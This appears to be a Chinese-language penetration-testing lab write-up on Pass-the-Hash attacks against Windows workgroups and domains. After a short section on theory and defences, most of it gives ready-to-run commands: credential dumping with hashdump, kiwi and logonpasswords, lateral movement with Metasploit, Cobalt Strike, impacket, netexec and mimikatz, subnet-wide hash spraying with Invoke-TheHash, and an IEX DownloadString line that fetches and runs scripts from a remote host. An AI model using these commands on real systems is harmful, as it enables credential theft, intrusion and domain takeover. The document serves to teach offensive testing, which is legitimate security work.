# 一、PTH攻击
## （1）什么是PTH攻击
PTH(Pass The Hash)是一种利用NTLM或LM哈希值而非明文密码进行身份验证的攻击技术。攻击者获取用户密码的哈希值后，可以直接使用该哈希值在网络中进行横向移动，无需破解出明文密码。

## （2）PTH攻击的前提条件
PTH攻击要成功实施，需要满足以下几个关键前提条件：
1.获取有效的密码哈希值 
- 必须已获取目标用户的NTLM或LM哈希值 
- 常见获取方式： 
	内存提取(如LSASS进程) 
	SAM数据库提取 
	域控制器上的NTDS.dit文件 
	网络嗅探NTLM认证流量 
2.目标系统使用NTLM 认证 
- 目标服务/系统必须允许NTLM认证 
- 如果系统强制使用Kerberos认证，PTH攻击将失效 
- 常见支持NTLM的服务： 
	SMB文件共享 
	RDP远程桌面(需特殊配置) 
	Windows远程管理(WinRM) 
	IIS Web应用(配置NTLM认证时) 
3.网络可达性 
- 攻击者必须能够通过网络访问目标系统 
- 相关端口必须开放： 
	SMB: 445/TCP 
	RDP: 3389/TCP 
	WinRM: 5985/5986(TCP) 
4.账户权限 
- 使用的哈希值对应的账户在目标系统上需要有足够的权限 
- 常见有效目标账户： 
	本地管理员组成员 
	域管理员组成员 
	具有远程登录权限的账户
KB2871997 补丁：2014 年 5 月 13 日微软发布了更新补丁 kb2871997，禁止本地管理员账户 （除 Administrator (SID 500)之外）用于远程连接，这样就无法以本地管理员用户的权限执行 wmi、PSEXEC、schtasks、at 和访问文件共享。

## （3）PTH攻击流程
1.信息收集阶段： 
- 获取目标系统的用户哈希值(通过LSASS内存转储、SAM数据库提取等方式) 
- 识别网络中的其他可访问系统 
2.哈希传递阶段： 
- 使用获取的哈希值尝试对其他系统进行身份验证 
- 常见工具：Mimikatz、Impacket套件中的psexec.py等 
3.权限提升与横向移动： 
- 成功验证后，在目标系统执行命令 
- 进一步收集新系统的哈希值，继续横向移动 
4.目标达成：
- 获取域管理员等高权限账户哈希 
- 控制整个域环境
![[Pasted image 20250627195050.png]]

## （4）PTH攻击原理
1.NTLM 认证机制：
- Windows系统使用NTLM协议进行身份验证时，实际上使用的是密码哈希值而非明文密码 
- 服务器端并不验证原始密码，只验证客户端提供的哈希值是否正确 
2.哈希重用特性： 
- 同一账户在不同机器上的密码哈希值相同(除非启用了CredSSP或限制NTLM) 
- 攻击者获取的哈希值可在整个域环境中重用 
3.协议设计缺陷： 
- NTLM协议设计时未考虑哈希值本身作为凭证的安全风险 
- 服务器无法区分哈希值是来自合法计算还是被窃取的

## （5）防御措施
1. 禁用NTLM，强制使用 Kerberos（组策略配置） 
2. 启用LSA 保护（防止Mimikatz抓取哈希） 
3. 限制本地管理员权限（最小权限原则） 
4. 监控异常登录行为（如SMB/WMI的哈希登录）
5. 启用Windows Defender Credential Guard（防止哈希窃取）

# 二、工作组PTH
## （1）Metasploit
### 1）获取 Hash
1. 通过 web 漏洞获得 PC 主机 webshell 
2. 利用 webshell 上传并执行 9999.exe 上线 meterpreter 会话 
3. 通过得到的 session 会话获得 PC 主机上用户密码 hash
```
hashdump

load kiwi

creds_all
```
![[Pasted image 20250705102526.png]]
4. 接下来通过获得的 administrator 用户的 hash 值进行 PTH 攻击

### 2）psexec 横向移动
内网环境采用正向 shell的 payload，得到内网目标主机的 shell会话

```
use exploit/windows/smb/psexec
set rhosts 10.10.10.20
set smbuser administrator
set smbpass aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24 2326cb9e7d85af4017a000f0
```
因为没开代理，以及payload没设置，没有获得会话
![[Pasted image 20250705104119.png]]

```
set payload windows/x64/meterpreter/bind_tcp
route add 10.10.10.0/24 1
```
![[Pasted image 20250619203128.png]]

注意：出现没有会话返回，需要关闭目标防火墙
![[Pasted image 20250705104725.png]]

## （2）CobaltStrike
### 1）获取 Hash
1. 通过 web 漏洞获得 PC 主机 webshell 
2. 利用 webshell 上传并执行 beacon.exe 上线 beacon 会话 
3. 得到 Beacon 会话后，执行 hashdump、logonpasswords 等命令即可得到当前 PC 主机用户 Hash
```
hashdump
logonpasswords
```
![[Pasted image 20250705110414.png]]

![[Pasted image 20250705110431.png]]

### 2）psexec 横向移动
1. 进入 listener，创建一个 beacon TCP（或者smb） 类型的监听器
![[Pasted image 20250705110604.png]]

2. 进入 target 内标试图，右键选择里要横向的目标主机，选择 psexec
![[Pasted image 20250705110655.png]]

3. 在 psexec 功能窗口选择获得的管理员用户及密码 hash，设置 Listener 监听器为第一步创建的 beacon tcp 监听器，选择我们得到的跳板机 session 会话
![[Pasted image 20250705110723.png]]

以上操作实际是在指定 Beacon 会话中执行如下命令：
```
rev2self
# 还原token令牌

pth PC\Administrator 4f95f1c5acfc3b972a1ce2a29ef1f1c5
# 使用mimikatz执行PTH操作
# mimikatz's sekurlsa::pth /user:"Administrator" /domain:"PC" /ntlm:4f95f1c5acfc3b972a1ce2a29ef1f1c5 /run:"%COMSPEC% /c echo 50465323d7f > \\.\pipe\03c5e4"

jump psexec WEB tcp1
# 生成 windows/beacon_bind_tcp (0.0.0.0:4443) 对应的 payload (\\WEB\ADMIN$\c930c4b.exe)，并上传到WEB主机
# 在WEB主机通过 Service Control Manager 创建并启动服务 c930c4b 运行 payload
```

最终成功得到 WEB 主机的 beacon 会话
![[Pasted image 20250705112352.png]]

## （3）impacket
### 1）wmiexec
- 执行命令
```
impacket-wmiexec -hashes :161cff084477fe596a5db81874498a24 PC/administrator@192.168.58.196 "ipconfig" -codec gbk 
```
![[Pasted image 20250705112721.png]]

获得cmd
![[Pasted image 20250705112946.png]]

### 2）smbexec
得到cmd
```
impacket-smbexec -hashes :161cff084477fe596a5db81874498a24 PC/administrator@192.168.58.196 -codec gbk
```
![[Pasted image 20250705113201.png]]

注意：如果是工作组，可以不用加主机名；如果是域用户，需要加域名
## （4）netexec
- smb
```
netexec smb 192.168.58.196 -u administrator -H 161cff084477fe596a5db81874498a24 --local-auth

netexec smb 192.168.58.196 -u administrator -H 161cff084477fe596a5db81874498a24 --local-auth -x whoami

netexec smb 192.168.58.196 -u administrator -H 161cff084477fe596a5db81874498a24 --local-auth --codec gbk -x ipconfig
```
![[Pasted image 20250705114728.png]]

- wmi
```
netexec wmi 192.168.58.196 -u administrator -H 161cff084477fe596a5db81874498a24 --local-auth -x whoami
```
![[Pasted image 20250705114927.png]]

- winrm
```
netexec winrm 192.168.58.196 -u administrator -H 161cff084477fe596a5db81874498a24 --local-auth -x whoami
```

# 三、域环境PTH
## （1）获取hash
- 和上面一样，使用msf的正向payload获取web主机的密码

- 上线 WEB 主机 session 会话，通过 kiwi 模块获取 WEB 主机中所有密码 hash
```
hashdump

load kiwi

creds_all
```
![[Pasted image 20250705205324.png]]

- 验证密码凭证
```
proxychains -q netexec smb targets.txt -u lisi -H 9d53d599686168692e0ddc171ccb97a5 -d xingyu.local --codec gbk
```
![[Pasted image 20250705220051.png]]
mingy\lisi 为域管理员用户，可以登录域控

- 访问域控
```
proxychains -q netexec smb 10.10.10.10 -u lisi -H 9d53d599686168692e0ddc171ccb97a5 -d xingyu.local --codec gbk -x whoami

proxychains -q netexec smb 10.10.10.10 -u lisi -H 9d53d599686168692e0ddc171ccb97a5 -d xingyu.local --codec gbk -x ipconfig
```
![[Pasted image 20250705220632.png]]

## （2）Metasploit
```
use exploit/windows/smb/psexec
set rhosts 10.10.10.10
set smbdomain xingyu.local
set smbuser lisi
set smbpass aad3b435b51404eeaad3b435b51404ee:9d53d599686168692e0ddc171ccb97a5
set payload windows/x64/meterpreter/bind_tcp
run
```
![[Pasted image 20250705221824.png]]
![[Pasted image 20250705221833.png]]

## （3）CobaltStrike
- 获取域用户 Hash
```
hashdump
logonpasswords
```
![[Pasted image 20250705224051.png]]

- 得到 mingy 域内 lisi 用户 ntlm hash ，发现是域管理员用户：
![[Pasted image 20250705224217.png]]

- 使用 psexec 得到域控 Beacon 会话
通过执行 net view 定位 DC 的 IP 地址： 10.10.10.10
```
net view
```

- 在 targets 列表视图中选择要横向移动的目标主机，右键选择横向移动，选择 psexec
![[Pasted image 20250705224443.png]]

- 成功获得DC主机的会话
![[Pasted image 20250706101128.png]]

## （4）impacket
- wmiexec 执行命令
```
proxychains -q impacket-wmiexec -hashes :9d53d599686168692e0ddc171ccb97a5 xingyu/lisi@10.10.10.10 "ipconfig" -codec gbk
```
![[Pasted image 20250706101709.png]]

- wmiexec 得到 cmd
```
proxychains -q impacket-wmiexec -hashes :9d53d599686168692e0ddc171ccb97a5 xingyu/lisi@10.10.10.10 -codec gbk
```
![[Pasted image 20250706101813.png]]

- smbexec 得到 cmd
```
proxychains -q impacket-smbexec -hashes :9d53d599686168692e0ddc171ccb97a5 xingyu/lisi@10.10.10.10 -codec gbk
```
![[Pasted image 20250706102006.png]]

## （5）netexec
- smb
```
proxychains -q netexec smb 10.10.10.10 -u lisi -H 9d53d599686168692e0ddc171ccb97a5 -d xingyu.local --codec gbk

proxychains -q netexec smb 10.10.10.10 -u lisi -H 9d53d599686168692e0ddc171ccb97a5 -d xingyu.local --codec gbk -x ipconfig
```
![[Pasted image 20250706102152.png]]
![[Pasted image 20250706102212.png]]

- wmi
```
proxychains -q netexec wmi 10.10.10.10 -u lisi -H 9d53d599686168692e0ddc171ccb97a5 -d xingyu.local --codec gbk -x ipconfig
```
![[Pasted image 20250706102313.png]]

-d 域名不加也行

# 四 、Mimikatz Hash传递攻击
当我们获得了内网中一台主机的 NTLM哈希值，我们可以利用 mimikatz对这个主机进行哈希传递攻击，执行命令成功后将会反弹回 cmd
```
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:administrator /domain:10.10.10.20 /ntlm:9d53d599686168692e0ddc171ccb97a5" exit
```

在弹出的cmd中，我们还可以直接连接该主机，还可以查看目录文件等操作
```
net use \\10.10.10.20\c$
dir \\10.10.10.20\c$
copy 1.exe \\10.10.10.20\c$
net use h: \\10.10.10.20\c$
```

# 五、CobaltStrike Hash传递攻击
使用已知管理员 Hash，批量撞指定网段机器，此方式同时适用于工作组和域环境。 需要同时加载 Invoke-WMIExec.ps1、Invoke-TheHash.ps1
- 加载脚本
```
powershell -exec bypass

Import-Module .\Invoke-WMIExec.ps1
Import-Module .\Invoke-TheHash.ps1
```

```
powershell -exec bypass

IEX (New-Object Net.WebClient).DownloadString('http://192.168.3.86:8000/Invoke-WMIExec.ps1');
IEX (New-Object Net.WebClient).DownloadString('http://192.168.3.86:8000/Invoke-TheHash.ps1');
```

```
Invoke-TheHash -Type WMIExec -Target 192.168.1.0/24 -Username administrator -Hash 579110c49145015c47ecd267657d3174
```

- 利用已有管理员hash，批量撞指定网段机器
```
# 工作组：
PS C:\Users\Administrator> Invoke-TheHash -Type WMIExec -Target 192.168.1.0/24 -Username administrator -Hash b4e535a9bb56bcc084602062c9e2a9d4

# 域：
PS C:\Users\Administrator> Invoke-TheHash -Type WMIExec -Target 10.10.10.0/24 -Domain mingy -Username administrator -Hash e1c61709dffcf154ac9d77b5024f6d10

# cs中一句话执行
shell powershell -exec bypass -command "& {import-module .\Invoke-TheHash.psd1;Invoke-TheHash -Type WMIExec -Target 192.168.41.0/24  -Username administrator -Hash 570a9a65db8fba761c1008a51d4c95ab}"
```